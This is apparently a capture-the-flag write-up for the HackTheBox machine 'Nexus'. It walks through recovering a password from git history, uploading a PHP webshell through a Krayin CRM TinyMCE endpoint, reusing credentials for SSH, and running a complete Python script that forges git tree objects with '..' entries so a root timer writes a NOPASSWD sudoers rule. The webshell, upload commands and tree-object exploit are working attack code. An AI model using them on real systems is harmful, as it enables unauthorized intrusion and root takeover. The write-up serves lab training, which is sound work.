@@ -1,0 +1,504 @@
+---
+slug: "htb-nexus"
+title: "Nexus — HackTheBox Machine Writeup"
+date: "2026-08-03"
+platform: "HackTheBox"
+type: "Machine"
+category: "Web"
+os: "Linux"
+difficulty: "Easy"
+tags:
+  - "Web"
+  - "Gitea"
+  - "Git History Leak"
+  - "Krayin CRM"
+  - "File Upload RCE"
+  - "Credential Reuse"
+  - "Path Traversal"
+  - "Sudoers"
+excerpt: "An Easy Linux box chaining a Gitea git-history password leak into a Krayin CRM file-upload RCE, a .env credential reuse for SSH, and a root-run template-sync script abused with crafted git tree objects containing a literal '..' directory to write a sudoers rule."
+readTime: "18 min"
+rating: 4.8
+hasAutoScript: true
+url: "https://asbawy.github.io/writeups/htb-nexus"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+<KillChain
+  steps={[
+    {
+      phase: "Analysis",
+      title: "Three vhosts, one credential trail",
+      desc: "nexus.htb hosts a corporate site whose footer leaks an email; subdomain fuzzing reveals a Gitea instance and a Krayin CRM. A public docker-setup repo hides a live DB password in its .env commit history.",
+      tools: ["nmap", "ffuf", "git"],
+    },
+    {
+      phase: "Exploitation",
+      title: "Krayin CRM file-upload RCE",
+      desc: "The leaked password logs into Krayin CRM as the admin user. Its TinyMCE upload endpoint accepts a PHP file disguised as a JPEG, giving an unauthenticated-by-misconfig webshell and command execution as www-data.",
+      tools: ["requests", "curl"],
+    },
+    {
+      phase: "Escalation",
+      title: "Root timer + git '..' tree objects",
+      desc: "Password reuse yields SSH as jones. A root systemd timer flattens Gitea template repos with os.path.join() and unsanitized ls-tree paths; hand-crafted git tree objects containing a literal '..' directory write /etc/sudoers.d/pwn as root.",
+      tools: ["git", "python3", "zlib"],
+    },
+  ]}
+/>
+
+## Challenge Overview
+
+Nexus is a masterclass in "deleted ≠ gone" and "trusting input shape". The first credential comes from git history, not from any server. The second comes from a `.env` read through an RCE that the first credential unlocked. And root comes from abusing a root-run sync script with a git tree object that no normal `git add` would ever let you create. Every stage reuses something that should have been rotated, sanitized, or anchored.
+
+<Callout type="info">
+Beginner note: this box rewards keeping a strict credential ledger. Three different passwords appear (Gitea history → Krayin login, production .env → SSH, Gitea web → template repo) and the first two are reused across services. Write every secret down as you find it. We explore systematic post-exploitation credential harvesting in our reference guide: **[Linux Privilege Escalation — Enumeration](/cheatsheet/linux/privesc-enumeration)**.
+</Callout>
+
+## Enumeration & Web Application Recon
+
+A full port scan shows a minimal attack surface:
+
+```text
+$ nmap -p- --min-rate 5000 -T4 -Pn -n 10.129.234.54
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+$ nmap -p 22,80 -sCV 10.129.234.54
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Nexus Energy Authority — Powering the Nation's Future
+```
+
+The root domain redirects to `http://nexus.htb/`, so virtual hosts are in play. Adding all three hostnames up front:
+
+```bash
+echo "10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
+```
+
+### Email harvesting
+
+The corporate homepage leaks two contact emails in its HTML — one of which will be a username later:
+
+```text
+careers@nexus.htb
+j.matthew@nexus.htb      <-- Krayin CRM admin account
+```
+
+### Subdomain enumeration
+
+Virtual-host fuzzing with ffuf against the top-5000 subdomain list:
+
+```bash
+ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 302
+```
+
+Two interesting hits:
+
+| Subdomain | Behavior |
+|-----------|----------|
+| `git.nexus.htb`     | HTTP 200 — Gitea instance |
+| `billing.nexus.htb` | HTTP 302 → `/admin/login` — Krayin CRM |
+
+<Callout type="warning">
+`billing.nexus.htb` 302s to its login page, so a naive `-fc 302` filter hides it from the results. If a vhost 302s on purpose, enumerate with `-mc all` or check the redirect target before filtering it out.
+</Callout>
+
+## Gitea — Credential Leak from Git History
+
+`git.nexus.htb` is Gitea with two visible users, `jones` and `admin`. The `admin` user owns a public repository named `krayin-docker-setup` — the deployment scaffolding for the CRM on `billing.nexus.htb`.
+
+The current `.env` in the repo shows a scrubbed database password:
+
+```ini
+DB_USERNAME=krayin
+DB_PASSWORD=
+```
+
+But the repo has two commits, and the earlier one still contains the real value. Git history never forgets:
+
+```bash
+$ git clone http://git.nexus.htb/admin/krayin-docker-setup.git
+$ cd krayin-docker-setup
+$ git log -p -- .env | grep -A2 -B2 DB_PASSWORD
+
+-DB_PASSWORD=N27xh!!2ucY04
++DB_PASSWORD=
+```
+
+<Callout type="info">
+This is the "credential leak from git history" pattern: secrets that were removed from a *file* still live in the *objects* of every commit that ever contained them. We detailed similar git metadata & repository history harvesting vectors in our writeup for **[HackTheBox Busqueda](/writeups/htb-busqueda)**. `git log -p -- <file>` is the fastest way to diff a file across its whole life.
+</Callout>
+
+The `APP_URL` in the same `.env` points at `http://billing.nexus.htb` — confirming this password belongs to the CRM. The password `N27xh!!2ucY04` is also the login for `j.matthew@nexus.htb`.
+
+## Foothold — Krayin CRM RCE (TinyMCE File Upload)
+
+### Logging in
+
+`http://billing.nexus.htb/admin/login` is a Krayin CRM admin login. The Laravel form carries a `_token` CSRF field and sets an `XSRF-TOKEN` cookie; both are needed for the authenticated upload. Logging in with the leaked credentials:
+
+```bash
+curl -s -c cookies.txt http://billing.nexus.htb/admin/login \
+  | grep -o 'name="_token" value="[^"]*"'
+```
+
+```text
+name="_token" value="AqwMNCezPyVvX8ivINBDHJLM70BwPbv02y2fnjPf"
+```
+
+```bash
+curl -s -b cookies.txt -c cookies.txt -X POST http://billing.nexus.htb/admin/login \
+  -d "_token=AqwMNCezPyVvX8ivINBDHJLM70BwPbv02y2fnjPf" \
+  -d "email=j.matthew@nexus.htb" -d "password=N27xh!!2ucY04"
+```
+
+Result: `302 → /admin/dashboard` and a `krayin_crm_session` cookie — we are in as the CRM administrator.
+
+### The upload endpoint
+
+The TinyMCE editor backend exposes `POST /admin/tinymce/upload`. It is meant for pasting images into rich-text fields, but it performs **no extension or MIME validation** on the server side. Uploading a PHP file with a `image/jpeg` content type sails through and lands in the web-accessible `storage/tinymce/` directory, executable by the PHP interpreter.
+
+<Callout type="warning">
+This is a classic "upload filter bypass by omission": the client sends `type=image/jpeg` in the multipart body, the server checks nothing server-side, and the filename extension `.php` is preserved in the stored path. We cover PHP file upload filter bypasses, web application auditing, and dynamic sinks in depth in our article: **[Source Code Review: Unearthing Critical Flaws in PHP](/logs/php-code-review)**.
+</Callout>
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+```bash
+XSRF=$(grep XSRF-TOKEN cookies.txt | awk '{print $7}')
+
+curl -s -b cookies.txt -H "X-XSRF-TOKEN: $XSRF" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  -F "file=@shell.php;type=image/jpeg" \
+  http://billing.nexus.htb/admin/tinymce/upload
+```
+
+The response returns the stored location:
+
+```json
+{"location":"http://billing.nexus.htb/storage/tinymce/4d8a0b28d0e025abb7798b602a675a36.php"}
+```
+
+### Command execution
+
+```bash
+curl "http://billing.nexus.htb/storage/tinymce/4d8a0b28d0e025abb7798b602a675a36.php?cmd=id"
+```
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Arbitrary command execution as `www-data`. From here the web root's environment file is the natural next stop.
+
+## Lateral Movement — www-data → jones
+
+The Krayin deployment lives at `/var/www/krayin`, and its production `.env` holds a *different* database password than the one in the Gitea repo — this one was never scrubbed:
+
+```bash
+curl "http://billing.nexus.htb/storage/tinymce/4d8a0b28d0e025abb7798b602a675a36.php?cmd=cat%20/var/www/krayin/.env"
+```
+
+```text
+APP_NAME="Krayin CRM"
+APP_ENV=local
+APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
+APP_DEBUG=true
+...
+DB_PASSWORD=y27xb3ha!!74GbR
+```
+
+<Callout type="tip">
+The `.env` also reveals `APP_DEBUG=true` — Laravel's debug toolbar is enabled and leaks stack traces, queries, and paths on every page. A separate finding, but it underscores how much this box leaks by default.
+</Callout>
+
+Testing that password against SSH: the box reuses it for the local `jones` account, who happens to own the Gitea account of the same name.
+
+```bash
+ssh jones@nexus.htb          # password: y27xb3ha!!74GbR
+```
+
+```text
+jones@nexus:~$ id
+uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
+jones@nexus:~$ cat /home/jones/user.txt
+f4ab38...03079dc74
+```
+
+<SpoilerFlag flag="f4ab384ca8f95f2ddf5782703079dc74" label="user.txt" />
+
+## Privilege Escalation — Root Timer + Git Tree-Object Traversal
+
+### The root-run template sync
+
+A systemd timer fires every minute:
+
+```bash
+jones@nexus:~$ systemctl list-timers | grep gitea
+-  -  Mon 2026-08-03 10:12:13 UTC  77ms ago  gitea-template-sync.timer  gitea-template-sync.service
+
+jones@nexus:~$ cat /etc/systemd/system/gitea-template-sync.service
+[Service]
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
+```
+
+The script is readable and its core loop is dangerously naive:
+
+```python
+# /etc/gitea/template-sync.py
+GITEA_URL = "http://localhost:3000"
+REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
+STAGING_DIR = "/home/git/template-staging"
+
+result = subprocess.run(
+    GIT + ['ls-tree', '-r', 'HEAD'], cwd=bare_path, ...)
+...
+for mode, objhash, filepath in entries:
+    target = os.path.join(stage_path, filepath)      # <-- unsanitized
+    target_dir = os.path.dirname(target)
+    os.makedirs(target_dir, exist_ok=True)
+    with open(target, 'wb') as f:
+        f.write(cat_result.stdout)
+```
+
+For every template repo, it runs `git ls-tree -r HEAD` and writes each blob to `os.path.join(stage_path, filepath)`. Three failures compound:
+
+1. `filepath` comes straight from git output — no sanitization.
+2. `os.path.join` happily resolves `..` — it does not confine the path to `stage_path`.
+3. `os.makedirs` creates any intermediate directory, including `..` components, so the whole ancestor chain materializes on disk.
+
+<Callout type="warning">
+If the writer had used `os.path.realpath(target).startswith(os.path.realpath(stage_path))` or `pathlib.Path.resolve().is_relative_to(...)`, the traversal would have died here. Path traversal flaws stemming from missing normalization are discussed extensively in **[CVE-2021-43798 Grafana Directory Traversal Deep Dive](/logs/cve-2021-43798-grafana-directory-traversal)**. As written, any `..` in a repo path escapes the staging directory with root privileges.
+</Callout>
+
+So the only question is: **how do we get a `..` path into a git tree?**
+
+### The git tree-object trick
+
+Git 2.35+ refuses to *index* filenames containing `..` — `git add` and even manual index edits reject them. But the **tree objects** stored in `.git/objects` are just raw binary structures: `"<mode> <name>\0<20-byte SHA>"` entries. Nothing validates the *name* when you write the object by hand. A tree can contain an entry whose name is literally `..`, and `git ls-tree -r` will flatten it into a path like `../../../../../../etc/sudoers.d/pwn`.
+
+<Callout type="tip">
+The check is in the index-write path, not in the object format. Hand-rolled tree objects bypass every `git add` safeguard because they never go through the index. This is the same class of attack as crafting zip entries with `../` paths — but for git's object database. For more Linux privilege escalation techniques involving custom binary crafts and root task hijacking, see **[Linux Privilege Escalation — Exploitation](/cheatsheet/linux/privesc-exploitation)**.
+</Callout>
+
+### Building the malicious template repo
+
+Since `template-sync.py` syncs any repo flagged `template=true`, the plan is:
+
+1. Create a template repo `pwn-template` as `jones` (the password `y27xb3ha!!74GbR` is reused for Gitea too).
+2. Hand-craft a commit whose tree contains a literal `..` directory chain resolving to `etc/sudoers.d/pwn`.
+3. Force-push it; within 60 seconds the root timer flattens the tree and writes the sudoers rule.
+
+The payload the tree will carry:
+
+```text
+jones ALL=(ALL) NOPASSWD: ALL
+```
+
+The builder — pure Python with `hashlib` + `zlib`, no index involved:
+
+```python
+#!/usr/bin/env python3
+import hashlib, os, zlib, time
+
+def write_obj(data, t):
+    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
+    s = h + data
+    sha = hashlib.sha1(s).hexdigest()
+    d = os.path.join(".git", "objects", sha[:2])
+    os.makedirs(d, exist_ok=True)
+    p = os.path.join(d, sha[2:])
+    if not os.path.exists(p):
+        open(p, "wb").write(zlib.compress(s))
+    return sha
+
+def entry(mode, name, sha):
+    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)
+
+# payload blob: the sudoers rule
+payload = b'jones ALL=(ALL) NOPASSWD: ALL\n'
+payload_blob = write_obj(payload, "blob")
+
+# nested trees: etc/sudoers.d/pwn
+sudoers_t   = write_obj(entry("100644", "pwn", payload_blob), "tree")
+sudoers_d_t = write_obj(entry("40000", "sudoers.d", sudoers_t), "tree")
+etc_t       = write_obj(entry("40000", "etc", sudoers_d_t), "tree")
+
+# 5 levels of ".." to escape /home/git/template-staging/jones/pwn-template/
+cur = etc_t
+for _ in range(5):
+    cur = write_obj(entry("40000", "..", cur), "tree")
+
+# root tree: README + one more ".."
+readme_blob = write_obj(b"# pwn\n", "blob")
+root = write_obj(
+    entry("100644", "README.md", readme_blob) + entry("40000", "..", cur), "tree")
+
+ts = int(time.time())
+commit = ("tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"
+          % (root, ts, ts)).encode()
+commit_sha = write_obj(commit, "commit")
+os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
+open(os.path.join(".git", "refs", "heads", "main"), "w").write(commit_sha + "\n")
+print("commit:", commit_sha)
+```
+
+### Verifying the flattened tree
+
+Git itself confirms the traversal path appears in `ls-tree -r` output — exactly what the root script will parse:
+
+```text
+$ git ls-tree -r HEAD
+100644 blob f27766ee83dd89926dfd9fffe24ea00d179e5845  README.md
+100644 blob 363212f744e242988c87a3fc0ca391bd53b2ae0b  ../../../../../../etc/sudoers.d/pwn
+```
+
+Creating the repo via the Gitea API (as `jones`) and force-pushing:
+
+```bash
+curl -u 'jones:y27xb3ha!!74GbR' -X POST \
+  http://git.nexus.htb/api/v1/user/repos \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"pwn-template","auto_init":false,"template":true}'
+
+cd pwn-template && python3 build.py && git push -u origin main --force
+```
+
+<Callout type="info">
+The `--force` is required because the crafted commit is written directly to `refs/heads/main` without a normal working-tree commit — the remote may consider it a non-fast-forward.
+</Callout>
+
+### Waiting for the timer
+
+Within one 60-second cycle the root timer picks up the repo, flattens the tree, and logs the traversal write:
+
+```text
+[2026-08-03 10:15:14] Syncing template: jones/pwn-template
+[2026-08-03 10:15:14]   synced: README.md
+[2026-08-03 10:15:14]   synced: ../../../../../../etc/sudoers.d/pwn
+[2026-08-03 10:15:14] Template sync complete
+
+jones@nexus:~$ ls -l /etc/sudoers.d/pwn
+-rw-r--r-- 1 root root 30 Aug  3 10:15 /etc/sudoers.d/pwn
+```
+
+The proof in `sudo -l`:
+
+```text
+jones@nexus:~$ sudo -l
+User jones may run the following commands on nexus:
+    (ALL) NOPASSWD: ALL
+```
+
+```bash
+jones@nexus:~$ sudo -n id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Verification & Proof of Work
+
+Two independent confirmations that the timer (not something else) wrote the file:
+
+1. **File provenance** — `/etc/sudoers.d/pwn` appears in the exact 60s window after the push, with root ownership, at the same moment `template-sync.log` records `synced: ../../../../../../etc/sudoers.d/pwn`.
+2. **Content correctness** — `sudo -l` now emits `(ALL) NOPASSWD: ALL` with no password prompt, and `sudo -n id` returns `uid=0(root)`, proving sudo parsed the dropped file (a malformed sudoers entry would cause a sudo error, not silent success).
+
+```bash
+# sudo cat /root/root.txt
+3e8d8e...b72a6aed4
+```
+
+<SpoilerFlag flag="3e8d8eaf2929889e806930bb72a6aed4" label="root.txt" />
+
+## Autosolve
+
+The entire chain — history leak, CRM login, webshell upload, RCE, `.env` harvest, SSH, crafted tree objects, push, and timer wait — fits in one standalone script. The standalone Python script [`autosolve/htb_nexus_solve.py`](./autosolve/htb_nexus_solve.py) runs the entire exploit in five automated stages and reads every credential dynamically off the live target.
+
+<TerminalReplay
+  title="htb_nexus_solve.py"
+  flags={[
+    { label: "user.txt", flag: "f4ab384ca8f95f2ddf5782703079dc74" },
+    { label: "root.txt", flag: "3e8d8eaf2929889e806930bb72a6aed4" },
+  ]}
+  flagSummary={[
+    "Recovered Krayin CRM DB password from Gitea git commit history.",
+    "Bypassed TinyMCE upload validation for RCE as www-data.",
+    "Harvested jones SSH password from production /var/www/krayin/.env.",
+    "Abused root systemd gitea-template-sync timer with crafted git '..' tree objects.",
+  ]}
+  steps={[
+    {
+      label: "Step 1/5 — Recover Gitea history password",
+      command: "python3 autosolve/htb_nexus_solve.py 10.129.234.54",
+      output: [
+        { text: ">> TARGET: 10.129.234.54", color: "blue" },
+        { text: "[1/5] Recover Krayin password from Gitea git history", color: "blue" },
+        { text: "  gitea leak DB_PASSWORD=N27xh!!2ucY04", color: "green" },
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 2/5 — Krayin CRM webshell upload & RCE",
+      output: [
+        { text: "[2/5] Krayin CRM login + TinyMCE webshell upload", color: "blue" },
+        { text: "  login     j.matthew@nexus.htb : N27xh!!2ucY04", color: "magenta" },
+        { text: "  webshell  http://billing.nexus.htb/storage/tinymce/4d8a0b28d0e025abb7798b602a675a36.php", color: "magenta" },
+        { text: "  RCE       uid=33(www-data) gid=33(www-data) groups=33(www-data)", color: "green" },
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 3/5 — Harvest jones password from production .env",
+      output: [
+        { text: "[3/5] Read /var/www/krayin/.env -> jones password", color: "blue" },
+        { text: "  password  jones : y27xb3ha!!74GbR", color: "green" },
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 4/5 — SSH as jones & user flag",
+      output: [
+        { text: "[4/5] SSH as jones", color: "blue" },
+        { text: "  user.txt  f4ab384ca8f95f2ddf5782703079dc74", color: "magenta" },
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 5/5 — Push '..' git tree objects & trigger root timer",
+      output: [
+        { text: "[5/5] Craft '..' tree objects -> push template repo -> wait for timer", color: "blue" },
+        { text: "  pushed    commit ea62eab9 -> jones/pwn-template (template)", color: "magenta" },
+        { text: "  tree      README.md", color: "magenta" },
+        { text: "  tree      ../../../../../../etc/sudoers.d/pwn", color: "magenta" },
+        { text: "  sudoers   jones ALL=(ALL) NOPASSWD: ALL written by root timer", color: "green" },
+        { text: "  root.txt  3e8d8eaf2929889e806930bb72a6aed4", color: "magenta" },
+      ],
+      delayAfter: 0,
+    },
+  ]}
+/>
+
+<Callout type="tip">
+Run the full solver with `python3 autosolve/htb_nexus_solve.py <TARGET_IP>`. It requires `requests`, `paramiko`, and the system `git` binary. The script is completely idempotent: template repos are scrubbed and re-initialized via the Gitea API before pushing, and sudoers polling accommodates the timer's 60-second interval. View all automated vault scripts in **[`/autosolve` Directory](../../../autosolve/README.md)**.
+</Callout>
+
+## References
+
+- [Gitea API — Repository Endpoints](https://docs.gitea.com/development/api-usage)
+- [HackTricks — File Upload Bypass Techniques](https://book.hacktricks.wiki/en/pentesting-web/file-upload.html)
+- [Git Internals — Tree & Blob Object Specification](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)
+- [GTFOBins — Sudo Security & Misconfigurations](https://gtfobins.github.io/)
+- [Source Code Review: Unearthing Critical Flaws in PHP](/logs/php-code-review)
+- [CVE-2021-43798 Grafana Directory Traversal Deep Dive](/logs/cve-2021-43798-grafana-directory-traversal)
+- [Linux Privilege Escalation — Exploitation](/cheatsheet/linux/privesc-exploitation)
+- [Linux Privilege Escalation — Enumeration](/cheatsheet/linux/privesc-enumeration)
+- [HackTheBox Busqueda Writeup](/writeups/htb-busqueda)
